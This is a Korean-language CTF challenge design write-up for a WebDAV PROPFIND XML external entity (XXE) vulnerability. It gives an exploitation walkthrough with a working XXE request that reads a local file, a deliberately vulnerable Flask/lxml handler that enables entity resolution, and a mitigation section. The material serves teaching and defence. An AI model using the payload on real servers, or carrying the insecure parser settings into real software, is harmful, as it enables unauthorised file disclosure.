---
title: WebDAV PROPFIND XML XXE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, xxe, xml-injection, webdav, propfind, information-disclosure, dtd]
confidence: high
---

# WebDAV PROPFIND XML XXE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: WebDAV Cloud Repository (WebDAV 클라우드 리포지터리)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹 공유 프로토콜 규격인 WebDAV의 속성 조회 메커니즘을 공략하는 **WebDAV PROPFIND XML 외부 엔티티 파싱(XXE)** 취약점 문제입니다. 대상 애플리케이션은 공유 폴더의 파일 정보 및 속성을 조회하기 위해 WebDAV 프로토콜을 사용하며, 클라이언트는 HTTP **`PROPFIND`** 메소드를 호출할 때 XML 형식의 쿼리 요청 바디를 전송합니다. 그러나 웹 서버 내부의 WebDAV XML 파서 모듈이 외부 엔티티 선언(DTD)을 차단하도록 안전하게 구성되어 있지 않습니다. 공격자는 `PROPFIND` 요청 본문에 외부 시스템 자원을 가져오도록 유도하는 DTD 악성 명세를 삽입해 전송함으로써, 서버 내부 중요 시스템 파일의 내용을 읽어오거나 내부 포트에 대한 진단을 수행합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **WebDAV Service (`/dav/`)**:
  - `PROPFIND`, `PROPPATCH` 등 WebDAV 전용 메소드를 파싱해 스토리지 파일 정보를 XML로 회신하는 모듈.
- **Flag 위치**:
  - 서버 내부 로컬 파일 시스템 파일 `/etc/flag`에 저장되어 있어 XXE 파일 로드를 통해 꺼내와야 합니다.

### 2.2 취약점 지점
1. **Insecure WebDAV XML Engine (XML Parser 오설정)**:
   - WebDAV 규격상, 디렉터리 내 파일 크기, 수정 날짜, 이름 등을 정의하기 위해 클라이언트가 보낸 XML 지시어(예: `<propfind xmlns="DAV:">`)를 파싱합니다.
   - 이때 파서 구성 환경(예: libxml2 구버전이나 특정 자바/파이썬 XML 라이브러리)에서 DTD 외부 참조 기능인 `External Entities` 파싱을 비활성화하지 않고 가동합니다.
   - 공격자는 일반 조회 노드 내에 DTD로 정의한 외부 엔티티 변수(`&xxe;`)를 바인딩하여 렌더링 시점에 파일 본문 내용이 응답 XML 본문에 강제 인쇄되게 만듭니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | HTTP 메소드 | 인증 | 요청 바디 규격 | 취약 파서 기능 |
|------------|-------------|------|----------------|----------------|
| `/dav/` / `/webdav/` | `PROPFIND` | 불필요 | XML | XML DTD / 외부 엔티티 해제 지원 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. WebDAV PROPFIND 가동 상태 진단
1. 타겟 디렉터리 경로에 `PROPFIND` 메소드로 일반 XML을 발송하여 정상 동작 여부 및 응답 XML 규격을 확인합니다.
   - **요청 패킷**:
     ```http
     PROPFIND /dav/ HTTP/1.1
     Host: dav.challenge.local
     Content-Length: 120
     Content-Type: application/xml
     
     <?xml version="1.0" encoding="utf-8" ?>
     <propfind xmlns="DAV:">
       <prop><displayname/></prop>
     </propfind>
     ```
   - **정상 응답**:
     ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <multistatus xmlns="DAV:">
       <response>
         <href>/dav/</href>
         <propstat>
           <prop><displayname>RootFolder</displayname></prop>
           <status>HTTP/1.1 200 OK</status>
         </propstat>
       </response>
     </multistatus>
     ```

### Step 2. DTD 주입 및 XXE 테스트
응답 XML 노드 중 `<displayname>`이나 다른 속성 값 렌더링 시점에 시스템 파일 내용이 리턴되도록 DTD 외부 엔티티 참조를 삽입합니다.
- **XXE 주입 PROPFIND 요청**:
  ```http
  PROPFIND /dav/ HTTP/1.1
  Host: dav.challenge.local
  Content-Length: 260
  Content-Type: application/xml
  
  <?xml version="1.0" encoding="utf-8" ?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/flag" >
  ]>
  <propfind xmlns="DAV:">
    <prop><displayname>&xxe;</displayname></prop>
  </propfind>
  ```

### Step 3. XML 파서 오동작 및 외부 파일 로드
1. 서버 내부 WebDAV 파서는 DTD 정의부의 `<!ENTITY xxe SYSTEM "file:///etc/flag" >` 지시어를 순독하고, 로컬 디렉터리의 `/etc/flag` 파일을 열어 그 안의 바이트 내용을 메모리 내 `xxe` 변수에 바인딩합니다.
2. 이어지는 바디 파싱에서 `<displayname>&xxe;</displayname>`를 만나 `xxe` 변수에 누적되어 있던 시스템 파일 본문을 해당 엘리먼트 값에 대입해 XML 렌더링을 마칩니다.

### Step 4. flag 획득
1. 반환되는 HTTP 응답 XML 구조를 가로챕니다.
2. `<displayname>` 노드의 값 위치에 출력된 플래그(`FLAG{webdav_propfind_xml_parser_xxe_leak}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python lxml 기반 모킹 예시)

```python
# dav_handler.py (취약한 WebDAV PROPFIND XML 처리 예시)
from flask import Flask, request, Response
from lxml import etree
import os

app = Flask(__name__)

@app.route('/dav/', methods=['PROPFIND'])
def handle_propfind():
    xml_data = request.data
    if not xml_data:
        return Response("Empty Body", status=400)

    try:
        # 취약점 지점 1: XML 파서 빌드 시 resolve_entities=True를 허용하고, 
        # load_dtd=True 처리를 주어 외부 DTD 조회가 가능하게 설정함
        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
        
        # XML 파싱 실행
        root = etree.fromstring(xml_data, parser)
        
        # displayname 속성을 임의로 읽어옴
        # (실제 WebDAV 구현은 스토리지 파일 메타데이터와 대조하지만, 
        # 여기서는 XML 노드 속성 값을 응답에 그대로 노출하는 오동작 구현)
        displayname_node = root.find('.//{DAV:}displayname')
        
        resolved_name = "DefaultDirectory"
        if displayname_node is not None:
            # 취약점 지점 2: DTD 엔티티가 디코딩 완료된 결과 텍스트가 resolved_name에 적재됨
            resolved_name = displayname_node.text or "EmptyName"

        # XML 응답 재조립
        response_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<multistatus xmlns="DAV:">
  <response>
    <href>/dav/</href>
    <propstat>
      <prop><displayname>{resolved_name}</displayname></prop>
      <status>HTTP/1.1 200 OK</status>
    </propstat>
  </response>
</multistatus>"""
        
        return Response(response_xml, mimetype='application/xml')
        
    except Exception as e:
        return Response(f"Error parsing XML: {str(e)}", status=500)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **외부 엔티티 해제 기능 완전 비활성화 (Disable External Entities / DTD)**:
   - WebDAV 및 XML 파싱 라이브러리 로드 시, DTD 선언 자체를 금지하고 외부 엔티티 파싱 지시어를 무력화하도록 설정을 강제합니다.
   - Python lxml 예: `etree.XMLParser(resolve_entities=False, no_network=True)`
   - Java DocumentBuilderFactory 예:
     `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
2. **WebDAV 안전 패치 구성 버전 업데이트**:
   - 직접 커스텀 파서를 작성하지 말고, Nginx WebDAV 모듈, Apache mod_dav 등 기성 보급 보안 패치가 완료된 WebDAV 정식 확장 인프라 구성을 도입해 사용합니다.
3. **MIME 타입 제어 및 WAF 필터링**:
   - `PROPFIND` 요청 바디 내에 `<!DOCTYPE` 또는 `SYSTEM`과 같은 XML 악성 구조 정의 문자열이 내포되어 있는 경우 게이트웨이 레이어에서 요청을 기각하도록 WAF 정책을 가동합니다.
   - XML 이외의 다른 방식으로 메타데이터 제어가 가능한 경우 WebDAV 프로토콜 자체의 연동을 중단합니다.
